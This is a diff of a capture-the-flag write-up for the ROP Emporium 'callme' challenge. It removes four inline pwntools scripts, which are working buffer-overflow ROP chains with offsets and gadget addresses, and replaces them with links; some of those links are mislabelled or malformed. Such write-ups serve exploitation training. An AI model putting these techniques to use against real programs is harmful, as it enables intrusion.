@@ -4,7 +4,7 @@
 
 ### Name: Callme (x86 & x64)
 
-### Description: You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+#### Description: You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
 
 ### Basic File Checks
 
@@ -318,63 +318,7 @@ End of assembler dump.
 gef➤ 
 ```
 
-Here's the exploit script 
-
-```
-from pwn import *
-
-# Binary filename
-exe = './callme32'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'info'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-# Start program
-io = process()
-
-# EIP/RIP offset
-offset = 44
-
-onegadget = 0x080487f9 #  pop esi; pop edi; pop ebp; ret; 
-arg1 = 0xdeadbeef
-arg2 = 0xcafebabe
-arg3 = 0xd00df00d 
-
-callme_one = 0x80484f0
-callme_two = 0x8048550
-callme_three = 0x80484e0
-
-
-# Build the payload
-payload = flat([
-    "A" * offset,
-    callme_one,
-    onegadget,
-    arg1,
-    arg2, 
-    arg3,
-    callme_two,
-    onegadget,
-    arg1,
-    arg2,
-    arg3,
-    callme_three,
-    onegadget,
-    arg1,
-    arg2,
-    arg3
-])
-
-# Send the payload
-io.sendlineafter(b'>', payload)
-
-io.interactive()
-```
+Here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/exploit32.py)
 
 On running it
 
@@ -391,42 +335,7 @@ ROPE{a_placeholder_32byte_flag!}
 [*] Got EOF while reading in interactive
 ```
 
-Here's the autopwn script using ROP
-
-```
-from pwn import *
-
-exe = './callme32'
-elf = context.binary = ELF(exe, checksec=False)
-
-io = process()
-
-padding  = "A" * 44
-params = [
-    0xdeadbeef,
-    0xcafebabe,
-    0xd00df00d
-]
-
-rop = ROP(elf)
-rop.callme_one(*params)
-rop.callme_two(*params)
-rop.callme_three(*params)
-
-chain = rop.chain()
-
-payload = flat([
-    padding,
-    chain
-])
-
-io.sendlineafter('>', payload)
-io.recvuntil('Thank you!\n')
-
-flag = io.recv()
-success(flag)
-
-```
+Here's the autopwn script using ROP [Script]([Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/autopwn32.py))
 
 It automates the stress 😭😭 but its cool 🙂
 
@@ -434,12 +343,12 @@ On running it we get the flag
 
 ```
 ┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/callme/32bits]
-└─$ python autopwn.py 
+└─$ python3 autopwn.py 
 [+] Starting local process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/32bits/callme32': pid 208792
 [*] Loaded 10 cached gadgets for './callme32'
 [+] callme_one() called correctly
-    callme_two() called correctly
-    ROPE{a_placeholder_32byte_flag!}
+[+] callme_two() called correctly
+[+] ROPE{a_placeholder_32byte_flag!}
 [*] Process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/32bits/callme32' stopped with exit code 0 (pid 208792)
 ```
 
@@ -459,66 +368,7 @@ So for the x64 binary the approach is similar but this time we need to pass in t
 
 The first one will work fine
 
-Here's the exploit script
-
-```
-from pwn import *
-
-# Binary filename
-exe = './callme'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'info'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-# Start program
-io = process()
-
-# EIP/RIP offset
-offset = 40
-
-onegadget = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret; 
-
-arg1 = 0xdeadbeefdeadbeef
-arg2 = 0xcafebabecafebabe
-arg3 = 0xd00df00dd00df00d 
-
-callme_one = 0x0000000000400720
-callme_two = 0x0000000000400740
-callme_three = 0x00000000004006f0
-
-
-# Build the payload
-payload = flat([
-    "A" * offset,
-    onegadget,
-    arg1,
-    arg2,
-    arg3,
-    callme_one,
-    onegadget,
-    arg1,
-    arg2,
-    arg3,
-    callme_two,
-    onegadget,
-    arg1,
-    arg2,
-    arg3,
-    callme_three
-])
-
-# Send the payload
-io.sendlineafter(b'>', payload)
-io.recvuntil('Thank you!\n')
-
-flag = io.recv()
-success(flag)
-```
+Here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/exploit32.py)
 
 On running it
 
@@ -527,45 +377,11 @@ On running it
 [+] Starting local process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/64bits/callme': pid 217944
 [+] callme_one() called correctly
 [+] callme_two() called correctly
-[+] ROPE{a_placeholder_32byte_flag!}
+[+] ROPE{a_placeholder_64byte_flag!}
 [*] Process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/64bits/callme' stopped with exit code 0 (pid 217944)
 ```
 
-it worked. Here's the autopwn script
-
-```
-from pwn import *
-
-exe = './callme'
-elf = context.binary = ELF(exe, checksec=False)
-
-io = process()
-
-offset = 40
- 
-params = [
-    0xdeadbeefdeadbeef,
-    0xcafebabecafebabe,
-    0xd00df00dd00df00d
-]
-
-rop = ROP(elf)
-rop.callme_one(*params)
-rop.callme_two(*params)
-rop.callme_three(*params)
-chain = rop.chain()
-
-payload = flat([
-    "A" * offset,
-    chain
-])
-
-io.sendlineafter('>', payload)
-io.recvuntil('Thank you!\n')
-
-flag = io.recv()
-success(flag)
-```
+it worked. Here's the autopwn script [Autopwn](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/autopwn64.py)
 
 Running it works also 
 
@@ -576,9 +392,7 @@ Running it works also
 [+] callme_one() called correctly
 [*] callme_two() called correctly
 [*] ROPE{a_placeholder_64byte_flag!}
-[*] Process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/64bits/callme' stopped with exit code 0 (pid 220794)
 ```
-
 
 And we're done 
 
